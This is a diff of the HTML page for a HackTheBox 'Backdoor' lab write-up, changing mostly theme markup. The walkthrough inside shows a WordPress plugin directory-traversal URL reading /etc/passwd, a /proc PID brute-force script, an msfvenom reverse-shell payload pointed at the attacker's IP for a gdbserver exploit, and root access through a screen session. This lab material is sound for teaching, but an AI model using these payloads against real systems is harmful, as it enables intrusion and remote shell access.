@@ -24,12 +24,11 @@
   <meta name="twitter:title" content="Backdoor Hackthebox writeup">
   <meta name="twitter:description" content="In this easy Linux box we are facing a wordpress plugin vulnerable to directory traversal letting us reading some files on the system , brute forcing the /proc/[pid] found a vulnerable gdb server running , exploiting it will gain low privilege shell , then abusing the screen binary to get the root access.">
       <meta name="twitter:site" content="@tinkerhell1337">
-<meta name="application-name" content="0xMesbaha">
-<meta name="apple-mobile-web-app-title" content="0xMesbaha">
-<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+<meta name="application-name" content="My cool site">
+<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hussienmisbah.github.io/posts/linux-machines/2022-01-21-backdoor/" /><link rel="prev" href="https://hussienmisbah.github.io/posts/web-exploitation/2022-04-17-sql-tutor/" /><link rel="next" href="https://hussienmisbah.github.io/posts/windows-machines/2022-04-26-windowsprivescarena/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hussienmisbah.github.io/posts/linux-machines/2022-01-21-backdoor/" /><link rel="prev" href="https://hussienmisbah.github.io/posts/web-exploitation/2022-04-17-sql-tutor/" /><link rel="next" href="https://hussienmisbah.github.io/posts/windows-machines/2022-04-26-windowsprivescarena/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
         <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
     {
         "@context": "http://schema.org",
@@ -48,18 +47,7 @@
             },"description": ""
     }
     </script></head>
-    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
-          const query = window.matchMedia('(prefers-color-scheme: dark)');
-          function applyTheme() {
-            let theme = window.localStorage?.getItem('theme') || 'dark';
-            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
-            document.body.setAttribute('theme', isDark? 'dark' : 'light');
-            document.body.setAttribute('cfg-theme', theme);
-          }
-
-          applyTheme();
-          query.addEventListener('change', applyTheme);
-        </script>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
 
         <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
     <div class="header-wrapper">
@@ -123,7 +111,7 @@
             <h2 class="toc-title">Contents</h2>
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Backdoor Hackthebox writeup</h1><div class="post-meta">
-            <div class="post-meta-line">&nbsp;<span class="post-category">in <a href="/categories/linux-machines/">Linux Machines</a></span></div>
+            <div class="post-meta-line">&nbsp;<span class="post-category">in <a href="/categories/linux-machines/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Linux Machines</a></span></div>
             <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-04-23">2022-04-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;674 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
@@ -143,12 +131,7 @@
             </div><div class="content" id="content"><p>In this easy Linux box we are facing a wordpress plugin vulnerable to directory traversal letting us reading some files on the system , brute forcing the /proc/[pid] found a vulnerable gdb server running , exploiting it will gain low privilege shell , then abusing the screen binary to get the root access.</p>
 <h1 id="scanning">Scanning</h1>
 <p>starting with a basic scanning :</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -A -T5 10.10.11.125
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -A -T5 10.10.11.125
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
 </span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
@@ -160,20 +143,15 @@
 </span></span><span class="line"><span class="cl"><span class="p">|</span>_http-generator: WordPress 5.8.1
 </span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Backdoor <span class="p">&amp;</span><span class="c1">#8211; Real-Life</span>
-</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel</span></span></code></pre></div></div>
-<p>then checking the full port scan :</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p- 10.10.11.125
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>then checking the full port scan :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p- 10.10.11.125
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">PORT     STATE SERVICE
 </span></span><span class="line"><span class="cl">22/tcp   open  ssh
 </span></span><span class="line"><span class="cl">80/tcp   open  http
-</span></span><span class="line"><span class="cl">1337/tcp open  waste</span></span></code></pre></div></div>
-<h1 id="enumeration">Enumeration</h1>
+</span></span><span class="line"><span class="cl">1337/tcp open  waste
+</span></span></code></pre></div><h1 id="enumeration">Enumeration</h1>
 <ul>
 <li>so let&rsquo;s start with the port 80 , it is a simple web application</li>
 </ul>
@@ -200,12 +178,7 @@
 <ul>
 <li>directory Busting with <code>dirsearch</code> default wordlist</li>
 </ul>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dirsearch -u http://10.10.11.125/ -x 403,404
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dirsearch -u http://10.10.11.125/ -x 403,404
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>00:18:04<span class="o">]</span> <span class="m">200</span> -   19KB - /license.txt
 </span></span><span class="line"><span class="cl"><span class="o">[</span>00:18:09<span class="o">]</span> <span class="m">200</span> -    7KB - /readme.html
@@ -220,8 +193,8 @@
 </span></span><span class="line"><span class="cl"><span class="o">[</span>00:18:14<span class="o">]</span> <span class="m">301</span> -  318B  - /wp-includes  -&gt;  http://10.10.11.125/wp-includes/
 </span></span><span class="line"><span class="cl"><span class="o">[</span>00:18:14<span class="o">]</span> <span class="m">200</span> -    0B  - /wp-includes/rss-functions.php
 </span></span><span class="line"><span class="cl"><span class="o">[</span>00:18:14<span class="o">]</span> <span class="m">200</span> -    0B  - /wp-cron.php
-</span></span><span class="line"><span class="cl"><span class="o">[</span>00:18:14<span class="o">]</span> <span class="m">200</span> -    6KB - /wp-login.php</span></span></code></pre></div></div>
-<ul>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>00:18:14<span class="o">]</span> <span class="m">200</span> -    6KB - /wp-login.php
+</span></span></code></pre></div><ul>
 <li>i should have noticed it from wappalayzer , however the Directory Busting reveals wordpress is running</li>
 <li>we can start enumerating possible users with <strong>wpscan</strong> or start fuzzing username and password but i spent alot of time at this rabbit hole with no lead.</li>
 <li>we can check the plugins from <code>/wp-content/plugins</code> path , we can know that from <a href="https://github.com/WordPress/WordPress/tree/master/" target="_blank" rel="noopener noreffer ">this</a> repository showing the default structure of a wordpress web application.</li>
@@ -248,13 +221,8 @@
 <ul>
 <li>first result seems promising let&rsquo;s view it :</li>
 </ul>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">searchsploit -x 39575.txt</span></span></code></pre></div></div>
-<p><img
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">searchsploit -x 39575.txt
+</span></span></code></pre></div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/assets/images/Backdoor/20220423063508.png"
@@ -285,13 +253,8 @@
         alt="/assets/images/Backdoor/20220423063824.png"
         title="error" /></p>
 <p>using :</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><pre tabindex="0"><code>http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../../etc/passwd</code></pre></div>
-<p><img
+<pre tabindex="0"><code>http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../../etc/passwd
+</code></pre><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/assets/images/Backdoor/20220423063953.png"
@@ -307,12 +270,7 @@
 <li>we can brute-force the Processes running on the system until we know what is the service running at this port</li>
 <li>using bash :</li>
 </ul>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="nv">i</span><span class="o">=</span><span class="m">2</span>
 </span></span><span class="line"><span class="cl"><span class="k">while</span>  <span class="o">[</span> <span class="m">1</span> <span class="o">]</span>
@@ -326,8 +284,8 @@
 </span></span><span class="line"><span class="cl"><span class="nb">break</span>
 </span></span><span class="line"><span class="cl"><span class="k">fi</span>
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span>   <span class="s2">&#34;Process ID </span><span class="nv">$i</span><span class="s2"> failed.&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="k">done</span></span></span></code></pre></div></div>
-<p><img
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/assets/images/Backdoor/20220423071608.png"
@@ -335,27 +293,17 @@
         data-sizes="auto"
         alt="/assets/images/Backdoor/20220423071608.png"
         title="error" /></p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> ~/CTFs/HTB/Backdoor$ cat response2.txt
-</span></span><span class="line"><span class="cl">/proc/814/cmdline/proc/814/cmdline/proc/814/cmdline/bin/sh-cwhile true<span class="p">;</span><span class="k">do</span> su user -c <span class="s2">&#34;cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;&#34;</span><span class="p">;</span> <span class="k">done</span>&lt;script&gt;window.close<span class="o">()</span>&lt;/script&gt;%</span></span></code></pre></div></div>
-<ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> ~/CTFs/HTB/Backdoor$ cat response2.txt
+</span></span><span class="line"><span class="cl">/proc/814/cmdline/proc/814/cmdline/proc/814/cmdline/bin/sh-cwhile true<span class="p">;</span><span class="k">do</span> su user -c <span class="s2">&#34;cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;&#34;</span><span class="p">;</span> <span class="k">done</span>&lt;script&gt;window.close<span class="o">()</span>&lt;/script&gt;%
+</span></span></code></pre></div><ul>
 <li>and we know now <strong>gdb server</strong> is running on that port , searching for exploits found <a href="https://www.exploit-db.com/exploits/50539" target="_blank" rel="noopener noreffer ">this</a> one</li>
 </ul>
 <h1 id="foothold">Foothold</h1>
 <ul>
 <li>trying the steps mentioned in the exploit :</li>
 </ul>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p linux/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.16.3 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> <span class="nv">PrependFork</span><span class="o">=</span><span class="nb">true</span> -o rev.bin</span></span></code></pre></div></div>
-<p><img
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p linux/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.16.3 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> <span class="nv">PrependFork</span><span class="o">=</span><span class="nb">true</span> -o rev.bin
+</span></span></code></pre></div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/assets/images/Backdoor/20220423072122.png"
@@ -367,13 +315,8 @@
 <li>and we got a shell as user <strong>user</strong></li>
 </ul>
 <h1 id="privilege-escalation">Privilege escalation</h1>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -perm -4000 2&gt;/dev/null</span></span></code></pre></div></div>
-<p><img
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -perm -4000 2&gt;/dev/null
+</span></span></code></pre></div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/assets/images/Backdoor/20220423072343.png"
@@ -384,13 +327,8 @@
 <ul>
 <li>screen binary with SUID doesn&rsquo;t have a clear path to gain root access, we can enumerate if the process is running with</li>
 </ul>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ps -ef --forest</span></span></code></pre></div></div>
-<p><img
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ps -ef --forest
+</span></span></code></pre></div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/assets/images/Backdoor/20220423072550.png"
@@ -431,14 +369,9 @@
 <ul>
 <li>so we can attach to this root screen with :</li>
 </ul>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># screen -x [user]/screen</span>
-</span></span><span class="line"><span class="cl">screen -x root/root</span></span></code></pre></div></div>
-<p><img
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># screen -x [user]/screen</span>
+</span></span><span class="line"><span class="cl">screen -x root/root
+</span></span></code></pre></div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/assets/images/Backdoor/20220423073352.png"
@@ -467,7 +400,7 @@
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-01-21-backdoor/" data-title="Backdoor Hackthebox writeup" data-via="tinkerhell1337" data-hashtags="Hackthebox,wordpress,Waste,directory Traversal,gdb server,screen"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-01-21-backdoor/" data-hashtag="Hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-01-21-backdoor/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=https%3a%2f%2fhussienmisbah.github.io%2fposts%2flinux-machines%2f2022-01-21-backdoor%2f&amp;text=Backdoor%20Hackthebox%20writeup" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-01-21-backdoor/" data-title="Backdoor Hackthebox writeup" data-via="tinkerhell1337" data-hashtags="Hackthebox,wordpress,Waste,directory Traversal,gdb server,screen"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-01-21-backdoor/" data-hashtag="Hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-01-21-backdoor/" data-title="Backdoor Hackthebox writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-01-21-backdoor/" data-title="Backdoor Hackthebox writeup"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-01-21-backdoor/" data-title="Backdoor Hackthebox writeup"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
             </div>
         </div>
     </div>
@@ -484,17 +417,14 @@
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">0xMesbaha</a></span></div>
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://hussienmisbah.github.io/" target="_blank">0xMesbaha</a></span></div>
         </div>
     </footer></div>
 
         <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                 <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
-            </a>
-        </div>
-
-        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                 <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
             </a>
-        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":5,"noResultsFound":"No results found","snippetLength":10,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":5,"noResultsFound":"No results found","snippetLength":10,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
 </html>
